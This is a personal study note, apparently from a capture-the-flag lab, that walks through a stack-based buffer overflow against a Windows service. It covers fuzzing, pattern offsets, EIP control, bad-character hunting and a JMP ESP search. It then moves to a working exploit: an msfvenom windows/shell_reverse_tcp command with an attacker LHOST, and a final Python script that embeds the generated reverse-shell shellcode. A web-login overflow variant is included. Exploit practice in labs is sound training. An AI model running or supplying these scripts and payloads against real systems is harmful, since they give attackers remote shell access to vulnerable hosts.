---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Stack Based Buffer Overflows]]  
___

## Description:  

### Quick Steps

1) Create your script to connect to the service and start overflowing the buffer. There is a web based example for a login page on the bottom.

2) find the offset with "msf-pattern_create -l 2400" (this guide suggested increasing the buffer by 400). Then use msf-pattern_offset -l 2400 -q 35724134

3) Create the script with the offset of As, 4 Bs, and then filler to finish out the buffer. You now have control of EIP.

4) Find bad characters. To be safe, assume \x00 is bad.

5) Find a jump point that does not contain bad chars. Use !mona jmp -r esp -cpb "\x00\x07\x2E\xA0" (the hex are bad chars). Once you find the address, set it as EIP. You need to write it backwards. 0x625011af will be written as "\xAF\x11\x50\x62"

Create payload with msfvenom -p windows/shell_reverse_tcp LHOST=10.6.26.166 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2E\xA0" -f py

add some no ops code with padding = "\x90" * 16

### Bad Chars Code
```
badchars = (

"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"

"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"

"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"

"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"

"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"

"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"

"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"

"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"

"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"

"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"

"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"

"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"

"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"

"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"

"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"

"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
```

### Code for each step
**Step 1
```
!/usr/bin/python

import socket

import time

import sys

#set up the UP and port we're connecting to

RHOST = "10.10.97.102"

RPORT = 1337

#create a loop to get buffer size, watch for crash in debugger

size = 100

while(size < 2400):

    try:

        print "\n Sending buffer with %s bytes" % size

        inputbuffer = "A" * size

# create a tcp connection (socket)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect((RHOST, RPORT))

#build your buffer. \n is a new line. a*1024 is where we are overloading the buffer.

        buf = "OVERFLOW1 "

        buf += inputbuffer

        buf +="\n"

# send your buffer down the socket

        s.send(buf)

#print out what we are sending to make it easier

        print "Sent: {0}".format(buf)

#receive some data from the socket and print it

        data = s.recv(1024)

        print "Received: {0}".format(data)

#finish the loop

        size += 100

        time.sleep(2)

    except:

        print "\nCould not connect!"
```

**Step 2
```
#!/usr/bin/python

import socket

import time

import sys

#set up the UP and port we're connecting to

RHOST = "10.10.97.102"

RPORT = 1337

#create a loop to get buffer size, watch for crash in debugger

size = 2400

inputbuffer = "A" * size

pattern ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"

# create a tcp connection (socket)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((RHOST, RPORT))

#build your buffer. \n is a new line. a*1024 is where we are overloading the buffer.

buf = "OVERFLOW1 "

buf += pattern

buf +="\n"

# send your buffer down the socket

s.send(buf)

#print out what we are sending to make it easier

print "Sent: {0}".format(buf)

#receive some data from the socket and print it

data = s.recv(1024)

print "Received: {0}".format(data)

#finish the loop

size += 100

time.sleep(2)

```
**step 3
```
socket

import time

import sys

#set up the UP and port we're connecting to

RHOST = "10.10.167.4"

RPORT = 1337

#create a loop to get buffer size, watch for crash in debugger

size = 2400

buffer = "A" * 1978

eip = "BBBB"

padding = "C" * 418

# create a tcp connection (socket)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((RHOST, RPORT))

#build your buffer. \n is a new line. a*1024 is where we are overloading the buffer.

buf = "OVERFLOW1 "

buf += buffer + eip + padding

buf +="\n"

# send your buffer down the socket

s.send(buf)

#print out what we are sending to make it easier

print "Sent: {0}".format(buf)

#receive some data from the socket and print it

data = s.recv(1024)

print "Received: {0}".format(data)
```
** Step 4
```
#!/usr/bin/python

import socket

import time

import sys

#set up the UP and port we're connecting to

RHOST = "10.10.167.4"

RPORT = 1337

#create a loop to get buffer size, watch for crash in debugger

size = 2400

buffer = "A" * 1978

eip = "BBBB"

#padding = "C" * 418

badchars = (

"\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"

"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"

"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30"

"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"

"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"

"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"

"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"

"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"

"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"

"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"

"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"

"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"

"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"

"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"

"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"

"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

# create a tcp connection (socket)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((RHOST, RPORT))

#build your buffer. \n is a new line. a*1024 is where we are overloading the buffer.

buf = "OVERFLOW1 "

buf += buffer + eip + badchars

buf +="\n"

# send your buffer down the socket

s.send(buf)

#print out what we are sending to make it easier

print "Sent: {0}".format(buf)

#receive some data from the socket and print it

data = s.recv(1024)

print "Received: {0}".format(data)
```
** Step 5
```
#!/usr/bin/python

import socket

import time

import sys

#set up the UP and port we're connecting to

RHOST = "10.10.167.4"

RPORT = 1337

#create a loop to get buffer size, watch for crash in debugger

size = 2400

buffer = "A" * 1978

eip = "\xAF\x11\x50\x62"

padding = "\x90" * 16

# create a tcp connection (socket)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((RHOST, RPORT))

#build your buffer. \n is a new line. a*1024 is where we are overloading the buffer.

buf = "OVERFLOW1 "

buf += buffer + eip + padding

buf += b"\xdb\xd0\xd9\x74\x24\xf4\x5a\xbe\x97\x81\xb4\xac\x33"

buf += b"\xc9\xb1\x52\x31\x72\x17\x83\xc2\x04\x03\xe5\x92\x56"

buf += b"\x59\xf5\x7d\x14\xa2\x05\x7e\x79\x2a\xe0\x4f\xb9\x48"

buf += b"\x61\xff\x09\x1a\x27\x0c\xe1\x4e\xd3\x87\x87\x46\xd4"

buf += b"\x20\x2d\xb1\xdb\xb1\x1e\x81\x7a\x32\x5d\xd6\x5c\x0b"

buf += b"\xae\x2b\x9d\x4c\xd3\xc6\xcf\x05\x9f\x75\xff\x22\xd5"

buf += b"\x45\x74\x78\xfb\xcd\x69\xc9\xfa\xfc\x3c\x41\xa5\xde"

buf += b"\xbf\x86\xdd\x56\xa7\xcb\xd8\x21\x5c\x3f\x96\xb3\xb4"

buf += b"\x71\x57\x1f\xf9\xbd\xaa\x61\x3e\x79\x55\x14\x36\x79"

buf += b"\xe8\x2f\x8d\x03\x36\xa5\x15\xa3\xbd\x1d\xf1\x55\x11"

buf += b"\xfb\x72\x59\xde\x8f\xdc\x7e\xe1\x5c\x57\x7a\x6a\x63"

buf += b"\xb7\x0a\x28\x40\x13\x56\xea\xe9\x02\x32\x5d\x15\x54"

buf += b"\x9d\x02\xb3\x1f\x30\x56\xce\x42\x5d\x9b\xe3\x7c\x9d"

buf += b"\xb3\x74\x0f\xaf\x1c\x2f\x87\x83\xd5\xe9\x50\xe3\xcf"

buf += b"\x4e\xce\x1a\xf0\xae\xc7\xd8\xa4\xfe\x7f\xc8\xc4\x94"

buf += b"\x7f\xf5\x10\x3a\x2f\x59\xcb\xfb\x9f\x19\xbb\x93\xf5"

buf += b"\x95\xe4\x84\xf6\x7f\x8d\x2f\x0d\xe8\xb8\xa9\x17\x4e"

buf += b"\xd4\xb7\x27\x9f\x79\x31\xc1\xf5\x91\x17\x5a\x62\x0b"

buf += b"\x32\x10\x13\xd4\xe8\x5d\x13\x5e\x1f\xa2\xda\x97\x6a"

buf += b"\xb0\x8b\x57\x21\xea\x1a\x67\x9f\x82\xc1\xfa\x44\x52"

buf += b"\x8f\xe6\xd2\x05\xd8\xd9\x2a\xc3\xf4\x40\x85\xf1\x04"

buf += b"\x14\xee\xb1\xd2\xe5\xf1\x38\x96\x52\xd6\x2a\x6e\x5a"

buf += b"\x52\x1e\x3e\x0d\x0c\xc8\xf8\xe7\xfe\xa2\x52\x5b\xa9"

buf += b"\x22\x22\x97\x6a\x34\x2b\xf2\x1c\xd8\x9a\xab\x58\xe7"

buf += b"\x13\x3c\x6d\x90\x49\xdc\x92\x4b\xca\xfc\x70\x59\x27"

buf += b"\x95\x2c\x08\x8a\xf8\xce\xe7\xc9\x04\x4d\x0d\xb2\xf2"

buf += b"\x4d\x64\xb7\xbf\xc9\x95\xc5\xd0\xbf\x99\x7a\xd0\x95"

buf +="\n"

# send your buffer down the socket

s.send(buf)

#print out what we are sending to make it easier

print "Sent: {0}".format(buf)

#receive some data from the socket and print it

data = s.recv(1024)

print "Received: {0}".format(data)
```
### Web Based POST request example
```
#!/usr/bin/python

import socket

import time

import sys

#This loop will increase the buffer until a crash. run the debugger while this runs

size = 100

while(size < 2000):

    try:

        print "\nSending evil buffer with %s bytes..." % size

        inputBuffer = "A" * size

        #This will be put in the bottom of the buffer

        content = "username="+inputBuffer+"&password=A"

#This is where we build the packet

        buffer = "POST /login HTTP/1.1\r\n" #\r\n is a windows line separator

        buffer += "Host: 172.16.0.106\r\n"

        buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"

        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.\r\n"

        buffer += "Accept-Language: en-US,en;q=0.5\r\n"

        buffer += "Accept-Encoding: gzip, deflate\r\n"

        buffer += "Referer: [http://172.16.0.106/login\r\n](http://172.16.0.106/login/r/n)"

        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"

        buffer += "Content-Length: "+str(len(content))+"\r\n"  #You need to set the content length to content

        buffer += "Connection: close\r\n"

        buffer += "Upgrade-Insecure-Requests: 1\r\n"

        buffer += "\r\n"

        buffer += content

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect(("172.16.0.106", 80))

        s.send(buffer)

        s.close()

        size += 100

        time.sleep(10)

    except:

        print "Could not connect!"

        sys.exit()
```

### msfvenom switch to migrate processes
`AutoRunScript=post/windows/manage/migrate`

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (01:27 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
